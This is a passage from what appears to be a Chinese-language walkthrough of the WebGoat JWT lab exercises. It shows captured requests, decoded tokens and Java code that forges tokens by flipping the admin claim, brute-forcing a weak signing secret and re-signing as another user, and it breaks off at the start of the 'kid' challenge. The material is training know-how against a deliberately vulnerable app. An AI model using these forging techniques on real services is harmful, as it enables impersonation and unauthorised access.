<span class="w">        </span><span class="n">Cookie</span><span class="w"> </span><span class="n">cookie</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Cookie</span><span class="p">(</span><span class="s">&quot;access_token&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">response</span><span class="p">.</span><span class="na">addCookie</span><span class="p">(</span><span class="n">cookie</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">response</span><span class="p">.</span><span class="na">setStatus</span><span class="p">(</span><span class="n">HttpStatus</span><span class="p">.</span><span class="na">UNAUTHORIZED</span><span class="p">.</span><span class="na">value</span><span class="p">());</span><span class="w"></span>
<span class="w">        </span><span class="n">response</span><span class="p">.</span><span class="na">setContentType</span><span class="p">(</span><span class="n">MediaType</span><span class="p">.</span><span class="na">APPLICATION_JSON_VALUE</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>可以看到设置了<code>admin</code>的值为<code>false</code>。另一方面，我们通过对生成的<code>access_token</code>解码，也可以得到<code>JWT</code>中<code>admin</code>的值为<code>false</code>：</p>
<div class="highlight"><pre><span></span><code><span class="err">eyJhbGciOiJIUzUxMiJ</span><span class="mf">9.e</span><span class="err">yJpYXQiOjE</span><span class="mi">2</span><span class="err">NzMwNjMwNDIsImFkbWluIjoiZmFsc</span><span class="mi">2</span><span class="err">UiLCJ</span><span class="mi">1</span><span class="err">c</span><span class="mi">2</span><span class="err">VyIjoiVG</span><span class="mi">9</span><span class="kc">t</span><span class="err">I</span><span class="kc">n</span><span class="mi">0</span><span class="err">=</span><span class="w"></span>
<span class="p">{</span><span class="nt">&quot;alg&quot;</span><span class="p">:</span><span class="s2">&quot;HS512&quot;</span><span class="p">}</span><span class="err">.</span><span class="p">{</span><span class="nt">&quot;iat&quot;</span><span class="p">:</span><span class="mi">1673063042</span><span class="p">,</span><span class="nt">&quot;admin&quot;</span><span class="p">:</span><span class="s2">&quot;false&quot;</span><span class="p">,</span><span class="nt">&quot;user&quot;</span><span class="p">:</span><span class="s2">&quot;Tom&quot;</span><span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>而题目要求我们需要获取<code>admin</code>权限，因此我们需要修改<code>JWT</code>中的<code>admin</code>的值。代码如下：</p>
<div class="highlight"><pre><span></span><code><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">fakeJwt</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">accessToken</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">Jwt</span><span class="w"> </span><span class="n">jwt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Jwts</span><span class="p">.</span><span class="na">parser</span><span class="p">().</span><span class="na">setSigningKey</span><span class="p">(</span><span class="n">JWT_PASSWORD</span><span class="p">).</span><span class="na">parse</span><span class="p">(</span><span class="n">accessToken</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">Claims</span><span class="w"> </span><span class="n">claims</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Claims</span><span class="p">)</span><span class="w"> </span><span class="n">jwt</span><span class="p">.</span><span class="na">getBody</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="c1">// 移除原来的</span><span class="w"></span>
<span class="w">    </span><span class="n">claims</span><span class="p">.</span><span class="na">remove</span><span class="p">(</span><span class="s">&quot;admin&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="c1">// 添加新的</span><span class="w"></span>
<span class="w">    </span><span class="n">claims</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;admin&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;true&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">fakeToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Jwts</span><span class="p">.</span><span class="na">builder</span><span class="p">()</span><span class="w"></span>
<span class="w">        </span><span class="p">.</span><span class="na">setClaims</span><span class="p">(</span><span class="n">claims</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="p">.</span><span class="na">signWith</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="na">jsonwebtoken</span><span class="p">.</span><span class="na">SignatureAlgorithm</span><span class="p">.</span><span class="na">HS512</span><span class="p">,</span><span class="w"> </span><span class="n">JWT_PASSWORD</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="p">.</span><span class="na">compact</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">fakeToken</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>代码效果如下：</p>
<p><img alt="image-20221228125438729" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221228125438729.png" /></p>
<p>于是我们可以通过抓包获取<code>access_token</code>，然后将修改后的<code>access_token</code>替换原来的值再放包，实现以<code>admin</code>的身份进行请求。我们只需要修改重置投票请求的<code>access_token</code>即可。</p>
<p><img alt="image-20221228130030961" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221228130030961.png" /></p>
<p><img alt="image-20221228130042879" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221228130042879.png" /></p>
<p><img alt="image-20221228130049661" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221228130049661.png" /></p>
<p>题目：<code>JWT cracking</code></p>
<p><img alt="image-20221228152209142" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221228152209142.png" /></p>
<p>先输入随机字符串，点击<code>Submit token</code>按钮提交请求进行抓包，得到接口地址<code>/WebGoat/JWT/secret</code>，查看源代码中接口的实现代码：</p>
<div class="highlight"><pre><span></span><code><span class="nd">@PostMapping</span><span class="p">(</span><span class="s">&quot;/JWT/secret&quot;</span><span class="p">)</span><span class="w"></span>
<span class="nd">@ResponseBody</span><span class="w"></span>
<span class="kd">public</span><span class="w"> </span><span class="n">AttackResult</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">token</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">Jwt</span><span class="w"> </span><span class="n">jwt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Jwts</span><span class="p">.</span><span class="na">parser</span><span class="p">().</span><span class="na">setSigningKey</span><span class="p">(</span><span class="n">JWT_SECRET</span><span class="p">).</span><span class="na">parse</span><span class="p">(</span><span class="n">token</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">Claims</span><span class="w"> </span><span class="n">claims</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Claims</span><span class="p">)</span><span class="w"> </span><span class="n">jwt</span><span class="p">.</span><span class="na">getBody</span><span class="p">();</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">claims</span><span class="p">.</span><span class="na">keySet</span><span class="p">().</span><span class="na">containsAll</span><span class="p">(</span><span class="n">expectedClaims</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">trackProgress</span><span class="p">(</span><span class="n">failed</span><span class="p">().</span><span class="na">feedback</span><span class="p">(</span><span class="s">&quot;jwt-secret-claims-missing&quot;</span><span class="p">).</span><span class="na">build</span><span class="p">());</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">claims</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;username&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">WEBGOAT_USER</span><span class="p">.</span><span class="na">equalsIgnoreCase</span><span class="p">(</span><span class="n">user</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">trackProgress</span><span class="p">(</span><span class="n">success</span><span class="p">().</span><span class="na">build</span><span class="p">());</span><span class="w"></span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">trackProgress</span><span class="p">(</span><span class="n">failed</span><span class="p">().</span><span class="na">feedback</span><span class="p">(</span><span class="s">&quot;jwt-secret-incorrect-user&quot;</span><span class="p">).</span><span class="na">feedbackArgs</span><span class="p">(</span><span class="n">user</span><span class="p">).</span><span class="na">build</span><span class="p">());</span><span class="w"></span>
<span class="w">            </span><span class="p">}</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">trackProgress</span><span class="p">(</span><span class="n">failed</span><span class="p">().</span><span class="na">feedback</span><span class="p">(</span><span class="s">&quot;jwt-invalid-token&quot;</span><span class="p">).</span><span class="na">output</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="na">getMessage</span><span class="p">()).</span><span class="na">build</span><span class="p">());</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>题目的意思是给出了一个<code>JWT</code>格式的<code>Token</code>，需要我们破解出密钥，并修改其中的<code>username</code>为<code>WebGoat</code>后，使用密钥重新签名生成新的<code>Token</code>进行提交。</p>
<p>代码如下：</p>
<div class="highlight"><pre><span></span><code><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">SECRETS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s">&quot;victory&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;business&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;available&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;shipping&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;washington&quot;</span><span class="p">};</span><span class="w"></span>
<span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">SECRETS</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TextCodec</span><span class="p">.</span><span class="na">BASE64</span><span class="p">.</span><span class="na">encode</span><span class="p">(</span><span class="n">s</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">try</span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">Jwt</span><span class="w"> </span><span class="n">jwt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Jwts</span><span class="p">.</span><span class="na">parser</span><span class="p">().</span><span class="na">setSigningKey</span><span class="p">(</span><span class="n">key</span><span class="p">).</span><span class="na">parse</span><span class="p">(</span><span class="n">JWT_TOKEN</span><span class="p">);</span><span class="w"></span>
<span class="w">            </span><span class="n">Claims</span><span class="w"> </span><span class="n">claims</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Claims</span><span class="p">)</span><span class="w"> </span><span class="n">jwt</span><span class="p">.</span><span class="na">getBody</span><span class="p">();</span><span class="w"></span>
<span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">claims</span><span class="p">);</span><span class="w"></span>
<span class="w">            </span><span class="c1">// 修改 username</span><span class="w"></span>
<span class="w">            </span><span class="n">claims</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;username&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;WebGoat&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">fakeToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Jwts</span><span class="p">.</span><span class="na">builder</span><span class="p">()</span><span class="w"></span>
<span class="w">                </span><span class="p">.</span><span class="na">setClaims</span><span class="p">(</span><span class="n">claims</span><span class="p">)</span><span class="w"></span>
<span class="w">                </span><span class="p">.</span><span class="na">signWith</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="na">jsonwebtoken</span><span class="p">.</span><span class="na">SignatureAlgorithm</span><span class="p">.</span><span class="na">HS512</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"></span>
<span class="w">                </span><span class="p">.</span><span class="na">compact</span><span class="p">();</span><span class="w"></span>
<span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">fakeToken</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="c1">//</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>需要注意的是，每个<code>Token</code>的有效期只有<code>60s</code>，所以还得拼一点手速。</p>
<p>题目：<code>Refreshing a token</code></p>
<p><code>From a breach of last year the following logfile is available</code><a href="http://127.0.0.1:9080/WebGoat/images/logs.txt"><code>here</code></a> <code>Can you find a way to order the books but let</code><strong><code>Tom</code></strong><code>pay for them?</code></p>
<p>题目需要下单购买书籍，但是让<code>Tom</code>来支付（显然当前用户并不是<code>Tom</code>）。需要我们在下单的请求中，修改用户认证信息中的用户名，我们先对下单请求抓个包：</p>
<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/WebGoat/JWT/refresh/checkout</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">127.0.0.1:9080</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded; charset=UTF-8</span>
<span class="na">Authorization</span><span class="o">:</span> <span class="l">Bearer eyJhbGciOiJIUzUxMiJ9.eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IkplcnJ5In0.Z-ZX2L0Tuub0LEyj9NmyVADu7tK40gL9h1EJeRg1DDa6z5_H-SrexH1MYHoIxRyApnOP7NfFonP3rOw1Y5qi0A</span>
<span class="na">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
<span class="na">Origin</span><span class="o">:</span> <span class="l">http://127.0.0.1:9080</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Referer</span><span class="o">:</span> <span class="l">http://127.0.0.1:9080/WebGoat/start.mvc</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">JSESSIONID=L4K-sHflDKLL8Yq3hLky553T0pwk0kZcaCLYZVG6</span>
<span class="na">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">empty</span>
<span class="na">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">cors</span>
<span class="na">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">same-origin</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">0</span>
</code></pre></div>
<p>接口地址是<code>/WebGoat/JWT/refresh/checkout</code>，保存用户信息的是<code>Authorization</code>字段。根据题目的意思，我们需要对<code>Authorization</code>的值进行解码，并修改其中的用户信息为<code>Tom</code>，重新生成<code>Authorization</code>并替换掉原来的值，然后放包。但是要解码<code>Authorization</code>需要密钥，我们先看源码：</p>
<div class="highlight"><pre><span></span><code><span class="nd">@PostMapping</span><span class="p">(</span><span class="s">&quot;/JWT/refresh/checkout&quot;</span><span class="p">)</span><span class="w"></span>
<span class="nd">@ResponseBody</span><span class="w"></span>
<span class="kd">public</span><span class="w"> </span><span class="n">ResponseEntity</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">checkout</span><span class="p">(</span><span class="nd">@RequestHeader</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;Authorization&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">required</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">token</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">token</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ResponseEntity</span><span class="p">.</span><span class="na">status</span><span class="p">(</span><span class="n">HttpStatus</span><span class="p">.</span><span class="na">UNAUTHORIZED</span><span class="p">).</span><span class="na">build</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">Jwt</span><span class="w"> </span><span class="n">jwt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Jwts</span><span class="p">.</span><span class="na">parser</span><span class="p">().</span><span class="na">setSigningKey</span><span class="p">(</span><span class="n">JWT_PASSWORD</span><span class="p">).</span><span class="na">parse</span><span class="p">(</span><span class="n">token</span><span class="p">.</span><span class="na">replace</span><span class="p">(</span><span class="s">&quot;Bearer &quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">));</span><span class="w"></span>
<span class="w">        </span><span class="n">Claims</span><span class="w"> </span><span class="n">claims</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Claims</span><span class="p">)</span><span class="w"> </span><span class="n">jwt</span><span class="p">.</span><span class="na">getBody</span><span class="p">();</span><span class="w"></span>
<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">claims</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;user&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;Tom&quot;</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">user</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">ok</span><span class="p">(</span><span class="n">trackProgress</span><span class="p">(</span><span class="n">success</span><span class="p">().</span><span class="na">build</span><span class="p">()));</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ok</span><span class="p">(</span><span class="n">trackProgress</span><span class="p">(</span><span class="n">failed</span><span class="p">().</span><span class="na">feedback</span><span class="p">(</span><span class="s">&quot;jwt-refresh-not-tom&quot;</span><span class="p">).</span><span class="na">feedbackArgs</span><span class="p">(</span><span class="n">user</span><span class="p">).</span><span class="na">build</span><span class="p">()));</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ExpiredJwtException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ok</span><span class="p">(</span><span class="n">trackProgress</span><span class="p">(</span><span class="n">failed</span><span class="p">().</span><span class="na">output</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="na">getMessage</span><span class="p">()).</span><span class="na">build</span><span class="p">()));</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">JwtException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ok</span><span class="p">(</span><span class="n">trackProgress</span><span class="p">(</span><span class="n">failed</span><span class="p">().</span><span class="na">feedback</span><span class="p">(</span><span class="s">&quot;jwt-invalid-token&quot;</span><span class="p">).</span><span class="na">build</span><span class="p">()));</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>根据源码我们编写替换<code>Authorization</code>的方法</p>
<div class="highlight"><pre><span></span><code><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">JWT_PASSWORD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;bm5n3SkxCX4kKRy4&quot;</span><span class="p">;</span><span class="w"></span>
<span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">JWT_TOKEN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;填写Burpsuite截获的Authorization&quot;</span><span class="p">;</span><span class="w"></span>
<span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">Jwt</span><span class="w"> </span><span class="n">jwt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Jwts</span><span class="p">.</span><span class="na">parser</span><span class="p">().</span><span class="na">setSigningKey</span><span class="p">(</span><span class="n">JWT_PASSWORD</span><span class="p">).</span><span class="na">parse</span><span class="p">(</span><span class="n">JWT_TOKEN</span><span class="p">.</span><span class="na">replace</span><span class="p">(</span><span class="s">&quot;Bearer &quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">));</span><span class="w"></span>
<span class="w">    </span><span class="n">Claims</span><span class="w"> </span><span class="n">claims</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Claims</span><span class="p">)</span><span class="w"> </span><span class="n">jwt</span><span class="p">.</span><span class="na">getBody</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">claims</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">claims</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;user&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Tom&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">fakeToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Jwts</span><span class="p">.</span><span class="na">builder</span><span class="p">()</span><span class="w"></span>
<span class="w">        </span><span class="p">.</span><span class="na">setClaims</span><span class="p">(</span><span class="n">claims</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="p">.</span><span class="na">signWith</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="na">jsonwebtoken</span><span class="p">.</span><span class="na">SignatureAlgorithm</span><span class="p">.</span><span class="na">HS512</span><span class="p">,</span><span class="w"> </span><span class="n">JWT_PASSWORD</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="p">.</span><span class="na">compact</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">fakeToken</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p><img alt="image-20221228183538984" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221228183538984.png" /></p>
<p><img alt="image-20221228183430632" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221228183430632.png" /></p>
<p>题目：<code>Final challenges</code></p>
<p><code>Below you see two account, one of Jerry and one of Tom. Jerry wants to remove Toms account from Twitter, but his token can only delete his own account. Can you try to help him and delete Toms account?</code></p>
<p>你需要从两个账户中删除<code>Tom</code>的账户，但是当前用户没有删除<code>Tom</code>账户的权限。我们对删除请求进行抓包</p>
<p><img alt="image-20221228185509910" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221228185509910.png" /></p>
<p>根据接口地址<code>/WebGoat/JWT/final/delete</code>查找源码中的实现方法代码：</p>
<div class="highlight"><pre><span></span><code><span class="nd">@PostMapping</span><span class="p">(</span><span class="s">&quot;/JWT/final/delete&quot;</span><span class="p">)</span><span class="w"></span>
<span class="kd">public</span><span class="w"> </span><span class="nd">@ResponseBody</span><span class="w"></span>
<span class="w">    </span><span class="n">AttackResult</span><span class="w"> </span><span class="nf">resetVotes</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="p">(</span><span class="s">&quot;token&quot;</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">token</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="p">......</span><span class="w"></span>
<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">errorMessage</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="kc">null</span><span class="p">};</span><span class="w"></span>
<span class="w">        </span><span class="n">Jwt</span><span class="w"> </span><span class="n">jwt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Jwts</span><span class="p">.</span><span class="na">parser</span><span class="p">().</span><span class="na">setSigningKeyResolver</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">SigningKeyResolverAdapter</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="nd">@Override</span><span class="w"></span>
<span class="w">            </span><span class="kd">public</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">resolveSigningKeyBytes</span><span class="p">(</span><span class="n">JwsHeader</span><span class="w"> </span><span class="n">header</span><span class="p">,</span><span class="w"> </span><span class="n">Claims</span><span class="w"> </span><span class="n">claims</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">                </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">kid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">header</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;kid&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">(</span><span class="kd">var</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dataSource</span><span class="p">.</span><span class="na">getConnection</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
